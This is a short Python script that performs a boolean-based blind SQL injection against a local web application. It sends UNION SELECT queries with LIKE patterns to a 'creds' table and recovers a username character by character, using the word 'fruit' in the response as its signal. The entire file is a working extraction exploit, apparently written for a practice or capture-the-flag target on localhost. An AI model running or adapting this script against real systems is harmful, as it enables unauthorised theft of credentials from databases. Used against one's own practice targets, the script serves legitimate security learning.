import requests

alphabets=[]

first = 'a'
for i in range(0, 26):
	alphabets.append(first)
	first = chr(ord(first) + 1)

entry=''
count=0
while(count<28):
	for x in alphabets:
		r=requests.get("http://localhost/?id=12 union select user from creds where user like '{}%'".format(entry+x))
		if 'fruit' in r.text:
			entry+=x
			print(entry)
			break
		else:
			pass
			count+=1
